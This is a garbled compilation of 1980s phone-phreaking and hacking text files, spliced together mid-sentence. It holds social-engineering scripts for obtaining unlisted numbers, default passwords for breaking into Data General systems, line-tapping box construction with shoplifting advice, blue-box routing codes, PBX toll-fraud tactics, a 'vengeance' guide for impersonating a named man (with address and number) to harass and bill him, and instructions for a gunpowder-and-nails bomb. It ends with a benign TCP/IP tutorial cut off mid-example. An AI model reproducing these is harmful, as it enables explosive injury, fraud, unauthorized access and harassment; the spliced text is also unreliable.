TO SERVICE REPS WHO ARE INSTALLING OR REPAIRING PHONES.

     TO GET THE DPAC NUMBER, A SERVICE REP WOULD CALL THE OLD STAND-BY,
CUSTOMER SERVICE NUMBER FOR BILLING INFORMATION IN THE TOWN THE NUMBER THE
PHONE IS LOCATED IN THAT HE IS TRYING TO GET THC UNLISTED NUMBER OF..  OKAY?

     THE CONVERSATION WOULD GO LIKE THIS, 'HI, SAN FRAN THIS IS JOE FROM SAN
MATEO BUVERY,SS OFFICE.  I NEED YOUR DPAC NUMBER FOR THE SOUTH END OF TOWN.'

     THE INFORMATION IS USUALLY PASSED OUT WITH NO HASSLE, IF THE FIRST PERSON
DOES NOT HAVE IT OR IS NOT HELPFUL, TRY ONE FROM A DIFFERENT PREFIX IN THE SAME
CITY.

     THE 'REP' WOULD THEN CALL DPAC (NOTE;  HE WOULD HAVE THE LISTING INFO FROM
HIS OWN DISTRICT; AGAIN HE IS CALLING FROM A NEARBY TOWN).

     ''HI, DEE-PAC THIS IS JOE FROM SAN MATEO PHONE STORE, I NEED THE LISTING
FOR 812 FIRST STREET.''

     THE SAN FRANCISCO WILL THEN GIVE THE NUMBER AT THE ADDRESS REQUESTED.
THERE IS NO NOTATION AT DPAC IF THE NUMBER IS LISTED OR UNLISTED.

     THE DPAC NUMBER FOR S.F. IS, LAST TIME IT WAS CHECKED, (415) 774-8924....

WELCOME TO THE BASICS OF HACKING III: D
ATA GENERAL COMPUTERS.  DATA GENERAL IS
FAVORED BY LARGE CORPORATIONS WHO NEED TO
HAVE A LOT OF DATA ON-LINE. THE DATA
GENERAL AOS, WHICH STANDS FOR ADVANCED OPERAT
ING SYSTEM, IS A VERSION OF BASTARDIZED UNIX.
 ALL THE COMMANDS WHICH WERE IN THE
UNIX ARTICLE, WILL WORK
ON A DATA GENERAL.   ONCE AGAIN, WE HAVE THE PROBLEM OF NO
T KNOWING THE FORMAT
FOR THE LOGIN NAME ON THE DATA GENERAL YOU WANT TO HACK.
AS SEEMS TO BE
STANDARD, TRY NAMES FROM ONE TO 8 DIGITS LONG.  DATA GENERAL DESIGNED THE
  COMPUTER TO BE FOR BUSI- NESSMEN, AND IS THUS VERY SIMPLISTIC, AND BASICALLY
FOOL PROOF (BUT NOT DAMN FOOL PROOF).  IT FOLLOWS THE SAME LOGIN FORMAT AS TH
YSTEM: DG=> LOGIN: YOU=> USERNAME DG|y=> PASSWORD: YOU=> PASSWORD PASSWORDS
CAN BE A MAXIMUM OF 8 CHARACTERS, AND THEY ARE ALMOST ALWAYS SET TO A DEFAULT
  OF 'AOS'
OR 'DG'. (ANY YOU KNOW ABOUT BUSINESSMEN...) A WORD ABOUT CONTROL
CHARACTERS: CNTRL-O STOPS MASSIVE PRINT-OUTS TO THE SCREEN, BUT LEAVES YOU IN
WHATEVER MODE YOU WERE.  (A TECHNICAL WORD ON WHAT THIS ACTUALLY DOES:  IT
TELLS THE CPU TO IGNORE THE
 TERMINAL, AND PRINTS EVERYTHING OUT TO THE CPU!
THIS IS  ABOUT 19200 BAUD, AND SO IT SEEMS LIKE IT JUST CANCELS.)  CNTRL-U
KILLS THE LINE YOU ARE TYPING AT THC TIME.  NOW FOR THE WEIRD ONE:  CNTRL-
TELLS THE CPU TO STOP, AND WAIT FOR ANOTHER C
NTRL CHARACTER.  TO STOP PROGRAM, YOU ACTUALLY NEED TO
 TYPE CNTRL-C AND THEN A C
NTRL-B. ONCE YOU GET ON,
                        TYPE 'HELP'.  MANY DG (DATA GENERAL) COMPUTERS ARE SOLD
N A PACKAGE DEAL,

   Another  elestial  =lite phile!





For those of you who are sick and

tired of ruining their phone with

white and beige boxes that make

stupid (and now because of ESS,

worthless) tones, there is now an

alternative.  (Thanks to Magnus!)





 How this came about:



Once I was reading and complaining

that there must be a better way to

attach alligator clips to a phun

phone without ruining it and making

it a permanent phone man's set.



I began to contemplate the basic idea

of this new box, when I said, "I just

happen to have a spare modulator and

some phone wire in my phreak kit at

home!"  Immediately I got some

alligator clips.  By the thought I

was thinking, I knew I was up to

something to solve this pain in the

ass problem.


 Construction of the Modu-Box:



You will need:



2 alligator clips

2 lengths of wire

   Preferably red and green about 1/2

   a foot long.

1 phone modulator

   This can be bought (shoplifted!)

   at Radio Shack or other

   electronics stores for not very

   many bucks.  (No bucks if

   shoplifted: the five finger

   discount)  They are simply a

   little beige colored square piece

   of plastic that has a phone jack

   in the front, and when the back is

   taken off, the inside has 4 wires

   ready to hitch up to a phone line.



Symbols:



Y R B G - yellow, red, black, and

          green terminals inside

 - length of red or green wire

      < - alligator clip

           |B|  |G<

           |Y|  |R<

The black and yellow should be left

alone.  (for later use)

Now plug your phone into the jack,

open up the terminal (explained in

the "Terminal Phun" phile), attach

the alligator clips to the bolts

inside, and if you get a dial tone,

then phreak OUT!



If you really want to be a smartass,

you can use the black and yellow also

and make a party line!  (brown box)

    This is a relatively new box,  and all it basically does
is  serve  as a  phone ringer.    You have  two choices  for
ringers, a piezoelectric transducer (ringer),  or a standard
8 ohm speaker.   The speaker has a more pleasant tone to it,
but either will do fine.    This circuit can also be used in
conjunction with a rust box to control an external something
or other  when the  phone  rings.   Just  connect  the 8 ohm
speaker output to the  inputs on  the rust box,  and control
the pot to tune it to light the light (which can be replaced
by a relay for external controlling) when the phone rings.

             DEALING WITH THE BAUE & ROUTE OPERATOR


        IT SEEMS THAT FEWER AND FEWER PEOPLE HAVE BLUE BOXES
THESE DAYS, AND THAT IS REALLY TOO BAD.  BLUE BOXES, WHILE NOT
ALL THAT GREAT FOR MAKING FREE CALLS (SINCE THE TPC CAN TELL WHEN
THE CALL WAS MADE, AS WELL AS WHERE IT WAS TOO AND FROM), ARE
REALLY A LOT OF FUN TO PLAY WITH.  SHORT OF BECOMING A REAL LIVE
TSPS OPERATOR, THEY ARE ABOUT THE ONLY WAY YOU CAN REALLY PLAY
WITH THE NETWORK.

        FOR THE FEW OF YOU WITH BLUE BOXES, HERE ARE SOME PHRASES
WHICH MAY MAKE LIFE EASIER WHEN DEALING WITH THE RATE & ROUTE
(R&R) OPERATORS.  TO GET THE R&R OP, YOU SEND A KP + 141 + ST.
IN SOME AREAS YOU MAY NEED TO PUT ANOTHER NPA BEFORE THE 141
(I.E., KP + 213 + 141 + ST), IF YOU HAVE NO LOCAL R&R OPS.

        THE R&R OPERATOR HAS A MYRIAD OF INFORMATION, AND ALL IT
TAKES TO GET THIS DATA IS MUMBLING CRYPTIC PHRASES.  THERE ARE
BASICALLY FOUR SPECIAL PHRASES TO GIVE THE R&R OPS.  THEY ARE
NUMBERS ROUTE, DIRECTORY ROUTE, OPERATOR ROUTE, AND PLACE NAME.

        TO GET AN R&R AN AREA CODE FOR A CITY, ONE CAN CALL THE
R&R OPERATOR AND ASK FOR THE NUMBERS ROUTE.  FOR EXAMPLE, TO FIND
THE AREA CODE FOR CARSON CITY, NEVADA, WE'D ASK THE R&R OP FOR
"CARSON CITY, NEVADA, NUMBERS ROUTE, PLEASE." AND GET THC ANSWER,
"RIGHT... 702 PLUS." MEANING THAT 702 PLUS 7 DIGITS GETS US
THERE.
        SOMETIMES DIRECTORY ASSISTANCE ISN'T JUST NPA + 131. THE
WAY TO GET THESE ROUTINGS IS TO CALL R&R AND ASK FOR "ANAHEIM,
CALIFORNIA, DIRECTORY ROUTE, PLEASE." OF COURSE, SHE'D TELL US IT
WAS 714 PLUS, WHICH MEANS 714 + 131 GETS US THE D.A. OP THERE.
THIS IS SORT OF POINTLESS EXAMPLE, BUT I COULDN'T COME UP WITH A
BETTER ONE ON SHORT NOTICE.

        LET'S SAY YOU WANTED TO FIND OUT HOW TO GET TO THE INWARD
OPERATOR FOR SACREMENTO, CALIFORNIA.  THE FIRST SIX DIGITS OF A
NUMBER IN THAT CITY WILL BE REQUIRED (THE NPA AND AN NXX).  FOR
EXAMPLE, LET US USE 916 756. WE WOULD CALL R&R, AND WHEN THE
OPERATOR ANSWERED, SAY, "916 756, OPERATOR ROUTE, PLEASE." THE
OPERATOR WOULD SAY, "916 PLUS 001 PLUS."  THIS MEANS THAT 916
+ 001 + 121 WILL GET YOU THE INWARD OPERATOR FOR SACRAMENTO. DO
YOU KNOW THE CITY WHICH CORRESPONDS TO 503 640?  THE R&R OPERATOR
DOES, AND WILL TELL YOU THAT IT IS HILLSBORO, OREGON, IF YOU
SWEETLY ASK FOR "PLACE NAME, 503 640, PLEASE."

        FOR EXAMPLE, LET'S SAY YOU NEED THE DIRECTORY ROUTE FOR
SVEG, SWEDEN. SIMPLY CALL R&R, AND ASK FOR, "INTERNATIONAL,
BADEN, SWITZERLAND. TSPS DIRECTORY ROUTE, PLEASE."  IN RESPONSE
TO THIS, YOU'D GET, "RIGHT... DIRECTORY TO SVEG, SWEDEN.  COUNTRY
CODE 46 PLUS 1170."  SO YOU'D ROUTE YOURSELF TO AN
INTERNATIONAL SENDER, AND SEND 46 + 1170 TO GET THE D.A. OPERATOR
IN SWEDEN.

        INWARD OPERATOR ROUTINGS TO VARIOUS COUNTRIES ARE
OBTAINED THE SAME WAY "INTERNATIONAL, LONDON, ENGLAND, TSPS
INWARD ROUTE, PLEASE." AND GET "COUNTRY CODE 44 PLUS 121."
THEREFORE, 44 PLUS 121 GETS YOU INWARD FOR LONDON.
        INWARDS CAN GET YOU LANGUAGE ASSITANCE IF YOU DON'T SPEAK
THE LANGUAGE. TELL THE FOREIGN INWARD, "UNITED STAES CALLING.
LANGUAGE ASSITANCE IN COMPLETING A CALL TO (CALLED PARTY) AT
(CALLED NUMBER)."
        R&R OPERATORS ARE PEOPLE ARE PEOPLE TOO, Y'KNOW.  SO
ALWAYS BE POLITE, MAKE SURE USE OF 'EM, AND DIAL WITH CARE.

NOW, WHAT YOU WILL NEED TO MAKE A PAPER BOMB:

 A CARDBOARD ROLL FROM TOILET PAPER OR FROM A ROLL OF PAPER TOWELS.
 (YOU KNOW, ONE OF THEOSE TUBES THAT YOU LIKE TO BEAT YOUR DOG WITH)
 SOME KLEENEXES
 SOME SMOKELESS GUNPOWDER (YOU CAN FIND IT AT YOUR LOCAL SPORTING GOODS STORE.)
 AND A ROLL OF DUCT TAPE (YOU DONT NEED THE WHOLE THING, JUST USE WHAT YOU NEED
TO AND USE THE REST TO TAPE UP YOUR SHIT HEAD BROTHER)
 AND FINALLY ABOUT 2 FEET OF WATERPROOF FUSE.

NOW WHAT TO DO WITH ALL THIS SHIT:

    TAKE A WAD (ABOUT 3 OR 4) KLEENEXES AND STUFF THE IN ONE END OF THE ROLL.
NOW TAKE THE GUNPOWDER AND  AND POUR IT INTO THE TUBE ABOUT HALF WAY UP.  NOW
TAKE THE FUSE AND STICK IT ALL THE WAY DOWN INTO THE POWDER.   NOW TAKE ANOTHER
WAD OF KLEENEX AND STUFF IT INTO THE END OF THE TUBE WITH THE FUSE STICKING OUT
OF IT.  PUT A SMALL PIECE OF TAPE ONTO THE TUBE TO HOLD THE KLEENEX IN, BUT
KEEP THE TAPE ABOUT 1/2 A CENTIMETER AWAY FROM THE FUSE.  ALSO, MAKE SUX_____E
ARE NO GAPS MORE THAN 1/2 CENTIMETER WIDE ANYWHERE IN THE TUBE.  NOW LIGHT THE
FUSE AND RUN LIKE HELL!

     THESE ARE FUN TO LIGHT AT PARTIES THAT ARE GOING KINDA BAD!  PUT ONE DOWN
THE SINK (NO WATER!) AND LIGHT IT UP!  (MAKE SURE THAT YOU ARE IN SOME GEEKS
HOUSE THAT NO ONE LIKES)  WHAT A RUSH!

     ANOTHER PHUKIN FUN THINGhM DO IS FILL THE TUBE WITH BB'S AND GUN POWDER
OR EVEN SMALL NAILS! TALK ABOUT DESTRUCTION!  TIE IT ON TO YOU'RE DOUCHE BAG

Whats is a PBX- Its just like a extender but it can dial alot more places,
overseas,800's,Alliances...ect. If have found them to be MUCH more safer
than using codes.

How to hack one??
PBX's are usely pretty easy to find, most companies hide there PBX's behind
answering machines,vmb's or some other kinda shit. This is my most commonly
used tactic for finding PBX's. Grab a newsweek,time or some mag. with a lot
of advertising and 800 #'s. The best place to find these #'s is in study
hall (If u'r in school). Write them down, go home and dial all of them after
buisness hours. Lets say u dial a 800 and get a answering maching, Start
pounding out tones, the most common keys are the #,0,*.Push one of those
when u get the answering machine, this usely (50% of the time) will take u
to one of the following, a operator, VMS, extension, xtender. WHen using a
PBX u always hit the 9 key for a outside line, so when u enter the VMB or
what ever it maybe hit 9. If u get a dial-tone u'r set to ill. Dial just
like u normally would, 1+ACN, or  alliance (allaince 0700456xxxx,
xxxx=1000,1001,1002,2000, ect.). PBX are really easy to find uld pkeep
venturing around in the 800 # and press 9 every where u go, u'r bound to exfind one somewhere. Dont hang-up if it says its transfering u to the
attendent, some times it is automated and thats where the PBX is hidden.
Please if u have other tactics on hacking PBX go ahead and add'em to this
file..... See u on a ALLIANCE. Later, The Duelist

                              PAYPHONES U.S.A.


By The Commander; Hale Staff Writer


We all know how payphones are direct fun and easy targets for phone phreaks who
enjoy prank calls. It's even a "polite" way of making them, after all, you
aren't waking anyone up at 4am (unless, of course, they have a payphone in
their kitchen), and some of the stupidest people in the world seem to pick
these things up.

Our fun has recently been destroyed by those damned Bell employees armed with
their little red stickers proclaming "Outgoing Calls Only." Well, this series
will aim to come up with the best list possible of payphones not yet protected
by this terrible scam.

Let's cut out the bullshit, and get right to the list. Enjoy them, and be sure
to send the numbers of your local payphones in! (Accurate descriptions of
locations are also nice...)

                                  AT&T
                            The Last Phreak?
                            ----------------
                             Vol. 1 Aug 8-89

   Could it be?  No more Phreaking!!  Yes fellow hackers, after viewing
   this text file you may change your mind all together about the sport of
   phreaking.  AT&T has introduced a new digital phone switch system which
   will revolutionize recognition of calls.  AT&T now has the ability to
   to catch a phreaker as soon as your call hits one of AT&T's many
   switches.  You may have noticed your calls accidentaly being diverted
   to other households.  This is due to the installation of the new AT&T
   digital Switching system.

   With this new system, AT&T will have all calling information up front
   instead of having to call it up from an outer terminal.  All information
   will be displayed and stored in a computer network.  Information such as
   the number you're dialing from, dialing to, time of dial, duration of
   time between each digit dialed ect...  You're instantly CNA'd as soon
   as your call hits the switch (DAMN!).  The information is then stored.

   In our area, this system has just been introduced and will be fully
   installed with in the next month.  After August, most area's will have
   this new digital system installed in every area.  MCI and AT&T are
   currently debating the format of programming on the system.

   You may have noticed the increase in phreakers being caught.  This is
   due to the new system.  Im sure this new system will have its bugs,
   but once it is perfected, there will not be a need for Jeff Dial Tones!!

   This system will give a new name to ANI (Automatic Number
   Identification). This file is not fully accurate, all the info has not
   been completely uncovered. 75% of this 1990 Phreak file has been based
   on fact, 25% on opinion. Watch for Volume II for more info on this
   system. If u have any info that was not mentioned in this file contact
   The Duelist on Jyer Inc.  And if u dont have the # your LAME!!!!!

                            WITH HELP FROM DR. DOVE


NOTE: THIS GUIDE IS STILL BEING COMPILED, AND AS PHONE PHREAKS LEARN MORE IN
THE ART OF VENGEANCE IT WILL ALWAYS EXPAND.


"Vengeance is mine", says the Phreak.


METHOD 1-PHONE LINE PHUN

Call up the business office.  It should be listed at the front of the white
pages.  Say you wanted to disconnect Scott Korman's line. DIAL 800-xxx-xxxx.
      "Hello, this is Mr. Korman, I'm moving to California and would like to
have  my phone service disconnected. I'm at the airport now.  I'm calling from
a payphone, my number is  [414] 445 5005. You can send my final bill to:
(somewhere in California). Thank you."


METHOD 2-PHONE BOOKS

Call up the business office from a pay phone.  Say :
     "Hello, I'd like to order a Phone Book for Upper Volta (or any out-of-the
way area with Direct Dialing).  This is Scott Korman, ship to 3119 N. 44th St.
Milwaukee, WI 53216.  Yes, I under stand it will cost $xx($25-$75!!). Thank
you."


METHOD 3-PHONE CALLS

Call up a PBX, enter the code and get an outside line.  Then dial 0+ the number
desired to call.  You will hear a bonk and then an operator.  Say, "I'd like to
charge this to my home phone at 414-445-5005. Thank you."  A friend and I did
this to a loser, I called him at 1:00 AM and we left the fone off the hook all
night.  I calculated that it cost him $168.


METHOD 4-MISC SERVICES

Call up the business office once again from a payfone.  Say you'd like call
waiting, forwarding, 3 way, etc.  Once again you are the famed loser Scott
Korman.  He pays-you laugh.  You don't know how funny it was talking to him,
and wondering what those clicks he kept hearing were.


METHOD 5-CHANGED & UNPUB

Do the same as in #4, but say you'd like to change and unlist your (Scott's)
number.  Anyone calling him will get:

    "BEW BEW BEEP.  The number you have reached, 445-5005, has been changed to
a non-published number.  No further....."


METHOD 6-FORWRDING

    This required an accomplice or two or three.  Around Christmas time, go to
Toys 'R' Us.  Get everyone at the customer service or manager's desk away
("Hey, could you help me").  then you get on their phone and dial (usually dial
9 first) and the business office again. This time, say you are from Toys 'R'
Us, and you'd like to add call forwarding to 445-5005.  Scott will get 100-600
calls a day!!!


METHOD 7-RUSSIAN CALLER

    Call a payphone at 10:00 PM.  Say to the operator that you'd like to book a
call to Russia.  Say you are calling from a payphone, and your number is that
of the loser to fry (e.g. 445-5005). She will say that she'll have to call ya
back in 5 hours, and you ok that. Meanwhile the loser (e.g.) Scott, will get a
call at 3:00 AM from an operator saying that the call he booked to Russia is
ready.

Introduction
~~~~~~~~~~~~
MIDNET is a regional computer network that is part of the NSFnet, the National
Science Foundation Network.  Currently, eleven mid-United States universities
are connected to each other and to the NSFnet via MIDnet:

UA  - University of Arkansas at Fayetteville
ISU - Iowa State University at Ames
UI  - University of Iowa at Iowa City
KSU - Kansas State University at Manhattan
KU  - University of Kansas at Lawrence
UMC - University of Missouri at Columbia
WU  - Washington University at St. Louis, Missouri
UNL - University of Nebraska at Lincoln
OSU - Oklahoma State University at Stillwater
UT  - University of Tulsa (Oklahoma)
OU  - University of Oklahoma at Norman

Researchers at any of these universities that have funded grants can access the
six supercomputer centers funded by the NSF:

John Von Neuman Supercomputer Center
National Center for Atmospheric Research
Cornell National Supercomputer Facility
National Center for Supercomputing Applications
Pittsburgh Supercomputing Center
San Diego Supercomputing Center

In addition, researchers and scientists can communicate with each other over a
vast world-wide computer network that includes the NSFnet, ARPAnet, CSnet,
BITnet, and others that you have read about in The Future Transcendent Saga.
Please refer to "Frontiers" (Phrack Inc., Volume Two, Issue 24, File 4 of 13)
for more details.

MIDnet is just one of several regional computer networks that comprise the
NSFnet system.  Although all of these regional computer networks work the same,
MIDnet is the only one that I have direct access to and so this file is written
from a MIDnet point of view.  For people who have access to the other regional
networks of NSFnet, the only real differences depicted in this file that would
not apply to the other regional networks are the universities that are served
by MIDnet as opposed to:

NYSERnet  in New York State
SURAnet   in the southeastern United States
SEQSUInet in Texas
BARRnet   in the San Francisco area
MERIT     in Michigan

           (There are others that are currently being constructed.)

These regional networks all hook into the NSFnet backbone, which is a network
that connects the six supercomputer centers.  For example, a person at Kansas
State University can connect with a supercomputer via MIDnet and the NSFnet
backbone.  That researcher can also send mail to colleagues at the University
of Delaware by using MIDnet, NSFnet and SURAnet.  Each university has its own
local computer network which connects on-campus computers as well as providing
a means to connecting to a regional network.

Some universities are already connected to older networks such as CSnet, the
ARPAnet and BITnet.  In principal, any campus connected to any of these
networks can access anyone else in any other network since there are gateways
between the networks.

Gateways are specialized computers that forward network traffic, thereby
connecting networks.  In practice, these wide-area networks use different
networking technology which make it impossible to provide full functionality
across the gateways.  However, mail is almost universally supported across all
gateways, so that a person at a BITnet site can send mail messages to a
colleague at an ARPAnet site (or anywhere else for that matter).  You should
already be somewhat familiar with this, but if not refer to;

"Limbo To Infinity" (Phrack Inc., Volume Two, Issue 24, File 3 of 13) and
"Internet Domains" (Phrack Inc., Volume Three, Issue 26, File 8 of 11)

Computer networks rely on hardware and software that allow computers to
communicate.  The language that enables network communication is called a
protocol.  There are many different protocols in use today.  MIDnet uses the
TCP/IP protocols, also known as the DOD (Department of Defense) Protocol Suite.

Other networks that use TCP/IP include ARPAnet, CSnet and the NSFnet.  In fact,
all the regional networks that are linked to the NSFnet backbone are required
to use TCP/IP.  At the local campus level, TCP/IP is often used, although other
protocols such as IBM's SNA and DEC's DECnet are common.  In order to
communicate with a computer via  MIDnet and the NSFnet, a computer at a campus
must use TCP/IP directly or use a gateway that will translate its protocols
into TCP/IP.

The Internet is a world-wide computer network that is the conglomeration of
most of the large wide area networks, including ARPAnet, CSnet, NSFnet, and the
regionals, such as MIDnet.  To a lesser degree, other networks such as BITnet
that can send mail to hosts on these networks are included as part of the
Internet.  This huge network of networks, the Internet, as you have by now read
all about in the pages of Phrack Inc., is a rapidly growing and very complex
entity that allows sophisticated communication between scientists, students,
government officials and others.  Being a part of this community is both
exciting and challenging.

This chapter of the Future Transcendent Saga gives a general description of the
protocols and software used in MIDnet and the NSFNet.  A discussion of several
of the more commonly used networking tools is also included to enable you to
make practical use of the network as soon as possible.


The DOD Protocol Suite
~~~~~~~~~~~~~~~~~~~~~~
The DOD Protocol Suite includes many different protocols.  Each protocol is a
specification of how communication is to occur between computers.  Computer
hardware and software vendors use the protocol to create programs and sometimes
specialized hardware in order to implement the network function intended by the
protocol.  Different implementations of the same protocol exist for the varied
hardware and operating systems found in a network.

The three most commonly used network functions are:

Mail          -- Sending and receiving messages
File Transfer -- Sending and receiving files
Remote Login  -- Logging into a distant computer

Of these, mail is probably the most commonly used.

In the TCP/IP world, there are three different protocols that realize these
functions:

SMTP   -- (Simple Mail Transfer Protocol) Mail
FTP    -- (File Transfer Protocol) sending and receiving files
Telnet -- Remote login

How to use these protocols is discussed in the next section.  At first glance,
it is not obvious why these three functions are the most common.  After all,
mail and file transfer seem to be the same thing.  However, mail messages are
not identical to files, since they are usually comprised of only ASCII
characters and are sequential in structure.  Files may contain binary data and
have complicated, non-sequential structures.  Also, mail messages can usually
tolerate some errors in transmission whereas files should not contain any
errors.  Finally, file transfers usually occur in a secure setting (i.e. The
users who are transferring files know each other's names and passwords and are
permitted to transfer the file, whereas mail can be sent to anybody as long as
their name is known).

While mail and transfer accomplish the transfer of raw information from one
computer to another, Telnet allows a distant user to process that information,
either by logging in to a remote computer or by linking to another terminal.
Telnet is most often used to remotely log in to a distant computer, but it is
actually a general-purpose communications protocol.  I have found it incredibly
useful over the last year.  In some ways, it could be used for a great deal of
access because you can directly connect to another computer anywhere that has
TCP/IP capabilities, however please note that Telnet is *NOT* Telenet.

There are other functions that some networks provide, including the following:

- Name to address translation for networks, computers and people
- The current time
- Quote of the day or fortune
- Printing on a remote printer, or use of any other remote peripheral
- Submission of batch jobs for non-interactive execution
- Dialogues and conferencing between multiple users
- Remote procedure call (i.e. Distributing program execution over several
                              remote computers)
- Transmission of voice or video information

Some of these functions are still in the experimental stages and require faster
computer networks than currently exist.  In the future, new functions will
undoubtedly be invented and existing ones improved.

The DOD Protocol Suite is a layered network architecture, which means that
network functions are performed by different programs that work independently
and in harmony with each other.  Not only are there different programs but
there are different protocols.  The protocols SMTP, FTP and Telnet are
described above.  Protocols have been defined for getting the current time, the
quote of the day, and for translating names.  These protocols are called
applications protocols because users directly interact with the programs that
implement these protocols.

The Transmission Control Protocol, TCP, is used by many of the application
protocols.  Users almost never interact with TCP directly.  TCP establishes a
reliable end-to-end connection between two processes on remote computers.  Data
is sent through a network in small chunks called packets to improve reliability
and performance.  TCP ensures that packets arrive in order and without errors.
If a packet does have errors, TCP requests that the packet be retransmitted.

In turn, TCP calls upon IP, Internet Protocol, to move the data from one
network to another.  IP is still not the lowest layer of the architecture,
since there is usually a "data link layer protocol" below it.  This can be any
of a number of different protocols, two very common ones being X.25 and
Ethernet.

FTP, Telnet and SMTP are called "application protocols", since they are
directly used by applications programs that enable users to make use of the
network.  Network applications are the actual programs that implement these
protocols and provide an interface between the user and the computer.  An
implementation of a network protocol is a program or package of programs that
provides the desired network function such as file transfer.  Since computers
differ from vendor to vendor (e.g. IBM, DEC, CDC), each computer must have its
own implementation of these protocols.  However, the protocols are standardized
so that computers can interoperate over the network (i.e. Can understand and
process each other's data).  For example, a TCP packet generated by an IBM
computer can be read and processed by a DEC computer.

In many instances, network applications programs use the name of the protocol.
For example, the program that transfers files may be called "FTP" and the
program that allows remote logins may be called "Telnet."  Sometimes these
protocols are incorporated into larger packages, as is common with SMTP.  Many
computers have mail programs that allow users on the same computer to send mail
to each other.  SMTP functions are often added to these mail programs so that
users can also send and receive mail through a network.  In such cases, there
is no separate program called SMTP that the user can access, since the mail
program provides the user interface to this network function.

Specific implementation of network protocols, such as FTP, are tailored to the
computer hardware and operating system on which they are used.  Therefore, the
exact user interface varies from one implementation to another.  For example,
the FTP protocol specifies a set of FTP commands which each FTP implementation
must understand and process.  However, these are usually placed at a low level,
often invisible to the user, who is given a higher set of commands to use.

These higher-level commands are not standardized so they may vary from one
implementation of FTP to another.  For some operating systems, not all of these
commands make equal sense, such as "Change Directory," or may have different
meanings.  Therefore the specific user interface that the user sees will
probably differ.

This file describes a generic implementation of the standard TCP/IP application
protocols.  Users must consult local documentation for specifics at their
sites.


Names and Addresses In A Network
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
In DOD Protocol Suite, each network is given a unique identifying number.  This
number is assigned by a central authority, namely the Network Information
Center run by SRI, abbreviated as SRI-NIC, in order to prevent more than one
network from having the same network number.  For example, the ARPAnet has
network number 10 while MIDnet has a longer number, namely 128.242.

Each host in a network has a unique identification so other hosts can specify
them unambiguously.  Host numbers are usually assigned by the organization that
manages the network, rather than one central authority.  Host numbers do not
need to be unique throughout the whole Internet but two hosts on the same
network need to have unique host numbers.

The combination of the network number and the host number is called the IP
address of the host and is specified as a 32-bit binary number.  All IP
addresses in the Internet are expressible as 32-bit numbers, although they are
often written in dotted decimal notation.  Dotted decimal notation breaks the
32-bit number into four eight-bit parts or octets and each octet is specified
as a decimal number.  For example, 00000001 is the binary octet that specifies
the decimal number 1, while 11000000 specifies 192.  Dotted decimal notation
makes IP addresses much easier to read and remember.

Computers in the Internet are also identified by hostnames, which are strings
of characters, such as "phrackvax."  However, IP packets must specify the
32-bit IP address instead of the hostname so  some way to translating hostnames
to IP addresses must exist.

One way is to have a table of hostnames and their corresponding IP addresses,
called a hosttable.  Nearly every TCP/IP implementation has such a hosttable,
although the weaknesses of this method are forcing a shift to a new scheme
called the domain name system.  In UNIX systems, the hosttable is often called
"/etc/hosts."  You can usually read this file and find out what the IP
addresses of various hosts are.  Other systems may call this file by a
different name and make it unavailable for public viewing.

Users of computers are generally given accounts to which all charges for
computer use are billed.  Even if computer time is free at an installation,
accounts are used to distinguish between the users and enforce file
protections.  The generic term "username" will be used in this file to refer to
the name by which the computer account is accessed.

In the early days of the ARPAnet which was the first network to use the TCP/IP
protocols, computer users were identified by their username, followed by a
commercial "at" sign (@), followed by the hostname on which the account
existed.  Networks were not given names, per se, although the IP address
specified a network number.

For example, "knight@phrackvax" referred to user "knight" on host "phrackvax."
This did not specify which network "phrackvax" was on, although that
information could be obtained by examining the hosttable and the IP address for
"phrackvax."  (However, "phrackvax" is a ficticious hostname used for this
presentation.)

As time went on, every computer on the network had to have an entry in its
hosttable for every other computer on the network.  When several networks
linked together to form the Internet, the problem of maintaining this central
hosttable got out of hand.  Therefore, the domain name scheme was introduced to
split up the hosttable and make it smaller and easier to maintain.

In the new domain name scheme, users are still identified by their usernames,
but hosts are now identified by their hostname and any and all domains of which
they are a part.  For example, the following address,
"KNIGHT@UMCVMB.MISSOURI.EDU" specifies username "KNIGHT" on host "UMCVMB".
However, host "UMCVMB" is a part of the domain "MISSOURI" " which is in turn
part of the domain "EDU".  There are other domains in "EDU", although only one
is named "MISSOURI".  In the domain "MISSOURI", there is only one host named
"UMCVMB".

However, other domains in "EDU" could theoretically have hosts named "UMCVMB"
(although I would say that this is rather unlikely in this example).  Thus the
combination of hostname and all its domains makes it unique.  The method of
translating such names into IP addresses is no longer as straightforward as
looking up the hostname in a table.  Several protocols and specialized network
software called nameservers and resolvers implement the domain name scheme.

Not all TCP/IP implementations support domain names because it is rather new.
In those cases, the local hosttable provides the only way to translate
hostnames to IP addresses.  The system manager of that computer will have to
put an entry into the hosttable for every host that users may want to connect
to.  In some cases, users may consult the nameserver themselves to find out the
IP address for a given hostname and then use that IP address directly instead
of a hostname.

I have selected a few network hosts to demonstrate how a host system can be
specified by both the hostname and host numerical address.  Some of the nodes I
have selected are also nodes on BITnet, perhaps even some of the others that I
do not make a note of due a lack of omniscent awareness about each and every
single host system in the world :-)

Please Note:  Not every system on BITnet has an IP address.  Likewise, not
              every system that has an IP address is on BITnet.  Also, while
              some locations like Stanford University may have nodes on BITnet
              and have hosts on the IP as well, this does not neccessarily
              imply that the systems on BITnet and on IP (the EDU domain in
              this case) are the same systems.

              Attempts to gain unauthorized access to systems on the Internet
              are not tolerated and is legally a federal offense.  At some
              hosts, they take this very seriously, especially the government
              hosts such as NASA's Goddard Space Flight Center, where they do
              not mind telling you so at the main prompt when you connect to
              their system.

              However, some nodes are public access to an extent.  The DDN
              Network Information Center can be used by anyone.  The server and
              database there have proven to be an invaluable source of
              information when locating people, systems, and other information
              that is related to the Internet.

Telnet

~~~~~~
Remote login refers to logging in to a remote computer from a terminal
connected to a local computer.  Telnet is the standard protocol in the DOD
Protocol Suite for accomplishing this.  The "rlogin" program, provided with
Berkeley UNIX systems and some other systems, also enables remote login.

For purposes of discussion, the "local computer" is the computer to which your
terminal is directly connected while the "remote computer" is the computer on
the network to which you are communicating and to which your terminal is *NOT*
directly connected.

Since some computers use a different method of attaching terminals to
computers, a better definition would be the following:  The "local computer" is
the computer that you are currently using and the "remote computer" is the
computer on the network with which you are or will be communicating.  Note that
the terms "host" and "computer" are synonymous in the following discussion.

To use Telnet, simply enter the command: TELNET

The prompt that Telnet gives is:  Telnet>

(However, you can specify where you want to Telnet to immediately and bypass
the the prompts and other delays by issuing the command:  TELNET [location].)

There is help available by typing in ?.  This prints a list of all the valid
subcommands that Telnet provides with a one-line explanation.

Telnet> ?

To connect to to another computer, use the open subcommand to open a connection
to that computer.  For example, to connect to the host "UMCVMB.MISSOURI.EDU",
